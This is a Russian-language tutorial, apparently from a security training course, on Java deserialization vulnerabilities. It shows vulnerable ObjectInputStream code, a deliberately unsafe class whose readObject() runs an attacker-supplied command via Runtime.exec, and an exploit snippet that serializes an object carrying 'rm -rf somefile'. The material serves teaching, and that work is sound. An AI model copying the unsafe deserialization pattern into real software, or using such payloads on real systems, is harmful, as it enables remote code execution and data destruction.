== Простейший эксплойт

=== Уязвимый код

Ниже приведен известный пример уязвимости десериализации Java.

[source,java]
----
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
----

Он ожидает объект `AcmeObject`, но выполнит `readObject()` до того, как произойдет приведение.
Если злоумышленник найдет правильный класс, реализующий опасные операции в `readObject()`, он может сериализовать этот объект и заставить уязвимое приложение выполнить эти действия.

=== Класс включен в ClassPath

Злоумышленникам необходимо найти класс в classpath, который поддерживает сериализацию и имеет опасные реализации в `readObject()`.

[source,java]
----
package org.dummy.insecure.framework;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.time.LocalDateTime;

public class VulnerableTaskHolder implements Serializable {

	private static final long serialVersionUID = 1;

	private String taskName;
	private String taskAction;
	private LocalDateTime requestedExecutionTime;

	public VulnerableTaskHolder(String taskName, String taskAction) {
		super();
		this.taskName = taskName;
		this.taskAction = taskAction;
		this.requestedExecutionTime = LocalDateTime.now();
	}

	private void readObject( ObjectInputStream stream ) throws Exception {
        //deserialize data so taskName and taskAction are available
		stream.defaultReadObject();

		//blindly run some code. #code injection
		Runtime.getRuntime().exec(taskAction);
     }
}
----

=== Эксплойт

Если указанный выше класс Java существует, злоумышленники могут сериализовать этот объект и получить удаленное выполнение кода.

[source,java]
----
VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");

ByteArrayOutputStream bos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bos);
oos.writeObject(go);
oos.flush();
byte[] exploit = bos.toByteArray();
----
